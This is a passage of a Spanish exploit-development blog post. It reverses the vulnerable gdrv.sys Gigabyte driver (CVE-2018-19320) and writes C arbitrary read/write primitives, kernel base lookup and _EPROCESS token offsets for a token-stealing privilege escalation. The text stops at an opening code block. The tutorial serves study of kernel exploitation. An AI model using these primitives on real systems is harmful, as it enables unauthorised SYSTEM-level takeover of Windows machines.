<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Arbitrary Write</title>

  <meta name="description" content="Explotación de un Arbitrary Write en modo kernel">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Arbitrary Write">
  <meta name="twitter:description" content="Explotación de un Arbitrary Write en modo kernel">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/exploit-development/windows-kernel/arbitrary-write/image.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Arbitrary Write">
  <meta property="og:description" content="Explotación de un Arbitrary Write en modo kernel">
  <meta property="og:image" content="/exploit-development/windows-kernel/arbitrary-write/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploit-development/windows-kernel/arbitrary-write/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Arbitrary Write" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploit-development/windows-kernel" title="xchg2pwn" class="blog-button">Windows Kernel Mode</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://linkedin.com/in/xchg2pwn" title="Linkedin" target="_blank">
                  <i class="icon icon-social-linkedin"></i>
                  <span class="label">Linkedin</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#reversing">Reversing Driver</a></li>
        <li><a href="#write">Arbitrary Write</a></li>
        <li><a href="#shellcode">Exec Shellcode</a></li>
        <li><a href="#shared">Shared Data</a></li>
        <li><a href="#integrity">Low Integrity</a></li>
    </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploit-development/windows-kernel/arbitrary-write/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Arbitrary Write</h2><br>
  </header>

<p class="plain-text">En este post explotaremos otra vulnerabilidad muy común en kernel: un Arbitrary Write, para ello usaremos <a href="https://www.gigabyte.com/FileUpload/mx/Microsite/357/features.html">Gigabyte App Center</a> en su versión <code class="language-plaintext highlighter-rouge">1.05.21</code>, que según el <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-19320">CVE-2018-19320</a> tiene una vulnerabilidad en el driver <a href="https://github.com/xchg2pwn/ExploitDevelopment/blob/main/GigabyteAppCenter_1.05.21/gdrv.sys">gdrv.sys</a> que se instala a la par del programa, y este contiene un manejo de datos incorrecto permitiendo al usuario escribir en cualquier parte de la memoria y de esta manera escalar privilegios.</p>

<section class="post" id="reversing">
<br><h3 class="post-title">Reversing Driver</h3><br>

<p class="plain-text">Luego de instalar el programa o simplemente cargar el driver con <code class="language-plaintext highlighter-rouge">sc.exe</code>, desde la máquina debugger deberíamos ser capaces de poder ver el módulo <code class="language-plaintext highlighter-rouge">gdrv</code> cargado.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">lm m gdrv
Browse full module list
start             end                 module name
fffff801`49f10000 fffff801`49f19000   gdrv       (deferred)</span>
</code></pre></div></div><br>

<p class="plain-text">Si miramos la información sobre el driver vemos que su <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code> se encuentra en un offset de <code class="language-plaintext highlighter-rouge">0x2d10</code> a partir de la base del driver, esta estructura es la encargada de gestionar las acciones que realizan los diferentes códigos <code class="language-plaintext highlighter-rouge">ioctl</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">!drvobj \driver\gdrv 2
Driver object (ffff908cd3ad7740) is for:
 \Driver\gdrv

DriverEntry:   fffff80149f17010	gdrv
DriverStartIo: 00000000	
DriverUnload:  fffff80149f114b0	gdrv
AddDevice:     00000000	

Dispatch routines:
[00] IRP_MJ_CREATE                      fffff80149f12d10	gdrv+0x2d10
[01] IRP_MJ_CREATE_NAMED_PIPE           fffff80142510770	nt!IopInvalidDeviceRequest
[02] IRP_MJ_CLOSE                       fffff80149f12d10	gdrv+0x2d10
[03] IRP_MJ_READ                        fffff80142510770	nt!IopInvalidDeviceRequest
[04] IRP_MJ_WRITE                       fffff80142510770	nt!IopInvalidDeviceRequest
[05] IRP_MJ_QUERY_INFORMATION           fffff80142510770	nt!IopInvalidDeviceRequest
[06] IRP_MJ_SET_INFORMATION             fffff80142510770	nt!IopInvalidDeviceRequest
[07] IRP_MJ_QUERY_EA                    fffff80142510770	nt!IopInvalidDeviceRequest
[08] IRP_MJ_SET_EA                      fffff80142510770	nt!IopInvalidDeviceRequest
[09] IRP_MJ_FLUSH_BUFFERS               fffff80142510770	nt!IopInvalidDeviceRequest
[0a] IRP_MJ_QUERY_VOLUME_INFORMATION    fffff80142510770	nt!IopInvalidDeviceRequest
[0b] IRP_MJ_SET_VOLUME_INFORMATION      fffff80142510770	nt!IopInvalidDeviceRequest
[0c] IRP_MJ_DIRECTORY_CONTROL           fffff80142510770	nt!IopInvalidDeviceRequest
[0d] IRP_MJ_FILE_SYSTEM_CONTROL         fffff80142510770	nt!IopInvalidDeviceRequest
[0e] IRP_MJ_DEVICE_CONTROL              fffff80149f12d10	gdrv+0x2d10
[0f] IRP_MJ_INTERNAL_DEVICE_CONTROL     fffff80142510770	nt!IopInvalidDeviceRequest
[10] IRP_MJ_SHUTDOWN                    fffff80142510770	nt!IopInvalidDeviceRequest
[11] IRP_MJ_LOCK_CONTROL                fffff80142510770	nt!IopInvalidDeviceRequest
[12] IRP_MJ_CLEANUP                     fffff80142510770	nt!IopInvalidDeviceRequest
[13] IRP_MJ_CREATE_MAILSLOT             fffff80142510770	nt!IopInvalidDeviceRequest
[14] IRP_MJ_QUERY_SECURITY              fffff80142510770	nt!IopInvalidDeviceRequest
[15] IRP_MJ_SET_SECURITY                fffff80142510770	nt!IopInvalidDeviceRequest
[16] IRP_MJ_POWER                       fffff80142510770	nt!IopInvalidDeviceRequest
[17] IRP_MJ_SYSTEM_CONTROL              fffff80142510770	nt!IopInvalidDeviceRequest
[18] IRP_MJ_DEVICE_CHANGE               fffff80142510770	nt!IopInvalidDeviceRequest
[19] IRP_MJ_QUERY_QUOTA                 fffff80142510770	nt!IopInvalidDeviceRequest
[1a] IRP_MJ_SET_QUOTA                   fffff80142510770	nt!IopInvalidDeviceRequest
[1b] IRP_MJ_PNP                         fffff80142510770	nt!IopInvalidDeviceRequest</span>
</code></pre></div></div><br>

<p class="plain-text">Iniciaremos por entender como funciona el driver asi que lo abrimos desde <code class="language-plaintext highlighter-rouge">IDA</code>, si miramos la función <code class="language-plaintext highlighter-rouge">DriverEntry</code> simplemente salta a la función <code class="language-plaintext highlighter-rouge">CreateSymbolicLink</code>.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/1.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/1.png"></p></div></a>

<p class="plain-text">La función que renombramos <code class="language-plaintext highlighter-rouge">CreateSymbolicLink</code> se encarga de establecer un nombre de dispositivo con <code class="language-plaintext highlighter-rouge">IoCreateDevice</code>, en este casi le asigna <code class="language-plaintext highlighter-rouge">\\.\GIO</code>, como sabemos esta será es la forma en la que podemos comunicarnos con el driver.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/2.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/2.png"></p></div></a>

<p class="plain-text">Una vez creado el objeto se configura la tabla <code class="language-plaintext highlighter-rouge">Dispatch Routines</code>, donde podemos encontrar <code class="language-plaintext highlighter-rouge">IoCtlHandler</code> que renombramos así ya que el offset coincide con el que vimos al inicio desde <code class="language-plaintext highlighter-rouge">WinDbg</code>, el offset pertenece a <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code>.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/3.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/3.png"></p></div></a>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">IoCtlHandler</code> se encarga de despachar funciones a través de los códigos <code class="language-plaintext highlighter-rouge">ioctl</code> que recibe, el driver acepta las llamadas a través de estructuras IRP, compara el <code class="language-plaintext highlighter-rouge">Major Function</code> con <code class="language-plaintext highlighter-rouge">0x2</code> y <code class="language-plaintext highlighter-rouge">0xe</code> que corresponden a solicitudes <code class="language-plaintext highlighter-rouge">IRP_MJ_CLOSE</code> e <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code>, nos interesa esta última para comunicarnos con el driver.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/4.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/4.png"></p></div></a>

<p class="plain-text">Si el byte es <code class="language-plaintext highlighter-rouge">0xe</code> significa que haremos una solicitud a través de códigos <code class="language-plaintext highlighter-rouge">ioctl</code>, asi que inicia una estructura de tipo <code class="language-plaintext highlighter-rouge">switch</code>, revisaremos poco a poco las opciones iniciando por <code class="language-plaintext highlighter-rouge">0xC3502808</code>, este código llama a una función llamada <code class="language-plaintext highlighter-rouge">ArbitraryWrite</code>.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/19.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/19.png"></p></div></a>
<a href="/exploit-development/windows-kernel/arbitrary-write/5.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/5.png"></p></div></a>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ArbitraryWrite</code> luego de mostrar sus valores usando <code class="language-plaintext highlighter-rouge">DbgPrint</code> inicia un bucle, primero guarda en el registro <code class="language-plaintext highlighter-rouge">rcx</code> el byte de origen y lo escribe en el puntero de destino en <code class="language-plaintext highlighter-rouge">rbx</code>, esto lo hace la cantidad de veces que diga la longitud en <code class="language-plaintext highlighter-rouge">rdx</code>.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/6.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/6.png"></p></div></a>

<p class="plain-text">Como podemos ver en los <code class="language-plaintext highlighter-rouge">mov</code> el primer valor es <code class="language-plaintext highlighter-rouge">Dst</code> que se encuentra en <code class="language-plaintext highlighter-rouge">[rax]</code> por lo que está en el offset <code class="language-plaintext highlighter-rouge">0</code>, luego <code class="language-plaintext highlighter-rouge">Src</code> que está en el offset <code class="language-plaintext highlighter-rouge">8</code> y finalmente la longitud que está en el offset <code class="language-plaintext highlighter-rouge">0x10</code>, los primeros 2 valores son una dirección del tamaño de un <code class="language-plaintext highlighter-rouge">qword</code> así que representaremos la estructura de la siguiente forma.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">typedef struct</span><span class="p"> CopyData {
    </span><span class="na">QWORD</span><span class="p"> DstAddress;
    </span><span class="na">QWORD</span><span class="p"> SrcAddress;
    </span><span class="na">DWORD</span><span class="p"> Size;
} </span><span class="na">CopyData</span><span class="p">;</span>
</code></pre></div></div><br>

<p class="plain-text">El siguiente código <code class="language-plaintext highlighter-rouge">ioctl</code> que vamos a analizar es <code class="language-plaintext highlighter-rouge">0xC3502580</code>, este llama a una función que renombramos como <code class="language-plaintext highlighter-rouge">EditMSR</code> ya que nos permite jugar con sus valores.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/20.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/20.png"></p></div></a>
<a href="/exploit-development/windows-kernel/arbitrary-write/7.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/7.png"></p></div></a>

<p class="plain-text">El driver inicia comparando el tamaño de la estructura con <code class="language-plaintext highlighter-rouge">16</code> bytes, después lee el <code class="language-plaintext highlighter-rouge">dword</code> en el offset <code class="language-plaintext highlighter-rouge">4</code> que corresponde al offset y lo mueve a <code class="language-plaintext highlighter-rouge">IndexMSR</code>, este será el registro que queremos usar, para fuinalizar el bloque termina comparando que el <code class="language-plaintext highlighter-rouge">dword</code> en el offset <code class="language-plaintext highlighter-rouge">0</code>, si es 0 salta a la linea verde de lo contrario salta a la linea roja.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/8.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/8.png"></p></div></a>

<p class="plain-text">Cuando el primer <code class="language-plaintext highlighter-rouge">dword</code> es diferente de <code class="language-plaintext highlighter-rouge">0</code> llama a la función <code class="language-plaintext highlighter-rouge">ReadMSR</code> y cuando termina mueve los valores de las variables de <code class="language-plaintext highlighter-rouge">LowMSR</code> y <code class="language-plaintext highlighter-rouge">HighMSR</code> a los dwords en los offsets <code class="language-plaintext highlighter-rouge">0x8</code> y <code class="language-plaintext highlighter-rouge">0xc</code>, pero podemos representar este mismo como un solo <code class="language-plaintext highlighter-rouge">qword</code>, en caso de que el primer dword en la estructura sea diferente a <code class="language-plaintext highlighter-rouge">0</code> entonces lee los valores de la estructura a las variables en el offset <code class="language-plaintext highlighter-rouge">0x8</code> para llamar a <code class="language-plaintext highlighter-rouge">WriteMSR</code>.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/9.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/9.png"></p></div></a>

<p class="plain-text">En la estructura el primer <code class="language-plaintext highlighter-rouge">dword</code> se usa para saber si queremos leer o escribir un registro, el segundo <code class="language-plaintext highlighter-rouge">dword</code> establece que registro queremos utilizar y para finalizar podemos representar los <code class="language-plaintext highlighter-rouge">2</code> dwords que corresponden al valor como un <code class="language-plaintext highlighter-rouge">qword</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">typedef struct</span><span class="p"> MSRData {
    </span><span class="na">DWORD</span><span class="p"> Type;
    </span><span class="na">DWORD</span><span class="p"> Register;
    </span><span class="na">QWORD</span><span class="p"> Value;
} </span><span class="na">MSRData</span><span class="p">;</span>
</code></pre></div></div><br>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ReadMSR</code> simplemente usa la instrucción <code class="language-plaintext highlighter-rouge">rdmsr</code> para guardar el valor del registro en <code class="language-plaintext highlighter-rouge">ecx</code> en <code class="language-plaintext highlighter-rouge">edx:eax</code> que luego guarda en las variables <code class="language-plaintext highlighter-rouge">LowMSR</code> y <code class="language-plaintext highlighter-rouge">HighMSR</code>.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/10.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/10.png"></p></div></a>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">WriteMSR</code> usa la instrucción <code class="language-plaintext highlighter-rouge">wrmsr</code> para guardar en el registro en <code class="language-plaintext highlighter-rouge">ecx</code> el valor especificado en <code class="language-plaintext highlighter-rouge">edx:eax</code> que obtiene de las variables <code class="language-plaintext highlighter-rouge">LowMSR</code> y <code class="language-plaintext highlighter-rouge">HighMSR</code>.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/11.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/11.png"></p></div></a>

<p class="plain-text">Vamos con otro de los códigos <code class="language-plaintext highlighter-rouge">ioctl</code> interesante, este se trata de <code class="language-plaintext highlighter-rouge">0xC3502800</code>, cuando enviamos este código se llama a la función renombrada a <code class="language-plaintext highlighter-rouge">AllocMemory</code>.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/12.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/12.png"></p></div></a>
<a href="/exploit-development/windows-kernel/arbitrary-write/13.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/13.png"></p></div></a>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">AllocMemory</code> obtiene el <code class="language-plaintext highlighter-rouge">Size</code> de <code class="language-plaintext highlighter-rouge">[rsi]</code>, osea desde el offset <code class="language-plaintext highlighter-rouge">0</code> de la entrada que es el único argumento, luego llama a <code class="language-plaintext highlighter-rouge">MmAllocateContiguousMemory</code>, esta función sirve para reservar memoria contigua y no paginada en el espacio de kernel.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/14.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/14.png"></p></div></a>

<p class="plain-text">Para finalizar guarda en el buffer de salia la dirección donde se reservó la memoria.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/15.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/15.png"></p></div></a>

</section>

<section class="post" id="write">
<br><h3 class="post-title">Arbitrary Write</h3><br>

<p class="plain-text">Definimos la función <code class="language-plaintext highlighter-rouge">ArbitraryWrite</code> basada en la primitiva de escritura que se nos proporciona en el código <code class="language-plaintext highlighter-rouge">0xC3502808</code>, establecemos los valores de la estructura a donde y que queremos escribir y definimos el tamaño <code class="language-plaintext highlighter-rouge">8</code> para escribir un <code class="language-plaintext highlighter-rouge">qword</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#define</span><span class="na"> IOCTL_COPY</span><span class="mi"> 0xC3502808

</span><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> what</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">) {
    CopyData userData;

    userData.DstAddress</span><span class="o"> =</span><span class="p"> where;
    userData.SrcAddress</span><span class="o"> =</span><span class="p"> what;
    userData.Size</span><span class="o"> =</span><span class="mi"> 8</span><span class="p">;

    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">)</span><span class="o"> sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> CopyData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
}</span>
</code></pre></div></div><br>

<p class="plain-text">Basados en la misma primitiva podemos establecer como argumento para <code class="language-plaintext highlighter-rouge">Src</code> la dirección de la que leeremos y como <code class="language-plaintext highlighter-rouge">Dst</code> un <code class="language-plaintext highlighter-rouge">qword</code> que establecemos nosotros, luego de hacer la llamada a la <code class="language-plaintext highlighter-rouge">ioctl</code> simplemente retornamos el valor copiado.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">QWORD ArbitraryRead</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> output;
    CopyData userData;

    userData.DstAddress </span><span class="o">=</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">output;
    userData.SrcAddress</span><span class="o"> =</span><span class="p"> where;
    userData.Size</span><span class="o"> =</span><span class="mi"> 8</span><span class="p">;

    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> CopyData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">return</span><span class="p"> output;
}</span>
</code></pre></div></div><br>

<p class="plain-text">La primera forma de explotar el driver será un <a href="/exploit-development/windows-kernel/kernel-shellcode#token-stealing">token stealing</a>, de acuerdo a lo que aprendimos en windows existe el proceso <code class="language-plaintext highlighter-rouge">System</code> con el pid <code class="language-plaintext highlighter-rouge">4</code>, este alberga los procesos en modo kernel por lo que debería correr con privilegios elevados.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">!process 0 0 System
PROCESS ffff9201e827e040
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad000  ObjectTable: ffffc60115459c80  HandleCount: 2456.
    Image: System</span>
</code></pre></div></div><br>

<p class="plain-text">La dirección que nos otorga el primer resultado es la de la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> de <code class="language-plaintext highlighter-rouge">System</code>, entre sus atributos podemos encontrar en el offset <code class="language-plaintext highlighter-rouge">0x4b8</code> el campo <code class="language-plaintext highlighter-rouge">Token</code>, cuando copiamos ese token a nuestro proceso deberiamos obtener sus privilegios.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffff9201e827e040 Token
   +0x4b8 Token : _EX_FAST_REF

</span><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffff9201e827e040 + 0x4b8
   +0x000 Object           : 0xffffc601`154447fc Void
   +0x000 RefCnt           : 0y1100
   +0x000 Value            : 0xffffc601`154447fc</span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo para encontrar la dirección del <code class="language-plaintext highlighter-rouge">_EPROCESS</code> de nuestro proceso actual tendremos que recorrer la lista <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code> en el offset <code class="language-plaintext highlighter-rouge">0x448</code> hasta que el valor de <code class="language-plaintext highlighter-rouge">UniqueProcessId</code> en el offset <code class="language-plaintext highlighter-rouge">0x440</code> sea igual al del proceso actual.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffff9201e827e040 UniqueProcessId
   +0x440 UniqueProcessId : 0x00000000`00000004 Void

</span><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffff9201e827e040 ActiveProcessLinks
   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffff9201`e83264c8 - 0xfffff807`6a81e200 ]</span>
</code></pre></div></div><br>

<p class="plain-text">Los offsets de la estructura pueden cambiar en las diferentes versiones antiguas de windows, pero estos se han mantenidos en las últimas versiones sin ningún cambio.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#define</span><span class="na"> OFFSET_Token</span><span class="mi"> 0x4b8
</span><span class="o">#define</span><span class="na"> OFFSET_UniqueProcessId</span><span class="mi"> 0X440
</span><span class="o">#define</span><span class="na"> OFFSET_ActiveProcessLinks</span><span class="mi"> 0x448</span>
</code></pre></div></div><br>

<p class="plain-text">El <code class="language-plaintext highlighter-rouge">kASLR</code> es un problema pero como vimos en otro post, la API <code class="language-plaintext highlighter-rouge">EnumDeviceDrivers</code> devuelve en su primer valor del arreglo la dirección base del módulo <code class="language-plaintext highlighter-rouge">ntoskrnl</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">QWORD</span><span class="na"> GetKernelBase</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> cbNeeded;

    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);
    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
}</span>
</code></pre></div></div><br>

<p class="plain-text">Para obtener el token de <code class="language-plaintext highlighter-rouge">System</code> primero necesitamos conocer la dirección de su estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code>, afortunadamente <code class="language-plaintext highlighter-rouge">PsInitialSystemProcess</code> la almacena.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">!process 0 0 System
PROCESS ffffe704ff878080
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad000  ObjectTable: ffffa70bd4259c80  HandleCount: 3152.
    Image: System

</span><span class="ro">0: kd></span><span class="p"> dq nt!PsInitialSystemProcess L1
fffff806`554fc420  ffffe704`ff878080</span>
</code></pre></div></div><br>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">GetESystemProcess</code> carga el binario <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code> y obtiene la dirección relativa al bloque del proceso <code class="language-plaintext highlighter-rouge">System</code>, finalmente calcula la dirección sumando el offset a la dirección base del kernel y lee el <code class="language-plaintext highlighter-rouge">_EPROCESS</code> de <code class="language-plaintext highlighter-rouge">PsInitialSystemProcess</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">QWORD GetSystemEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
    </span><span class="na">HMODULE</span><span class="p"> hKernel </span><span class="o">= </span><span class="p">LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);

    </span><span class="na">QWORD</span><span class="p"> userPsInitialProcess</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);
    </span><span class="na">QWORD</span><span class="p"> offsetPsInitialProcess</span><span class="o"> =</span><span class="p"> userPsInitialProcess</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
    </span><span class="na">QWORD</span><span class="p"> kernelPsInitialProcess</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> offsetPsInitialProcess;

    </span><span class="na">QWORD</span><span class="p"> systemEProcess </span><span class="o">=</span><span class="p"> ArbitraryRead(hDevice, kernelPsInitialProcess);

    FreeLibrary(hKernel);
    </span><span class="o">return</span><span class="p"> systemEProcess;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Ya con la dirección de un valor de la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> podemos recorrer toda la lista doblemente enlazada <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code> hasta que el valor <code class="language-plaintext highlighter-rouge">UniqueProcessId</code> coincida con el valor del <code class="language-plaintext highlighter-rouge">ProcessId</code> actual que obtenemos con <code class="language-plaintext highlighter-rouge">GetCurrentProcessId</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
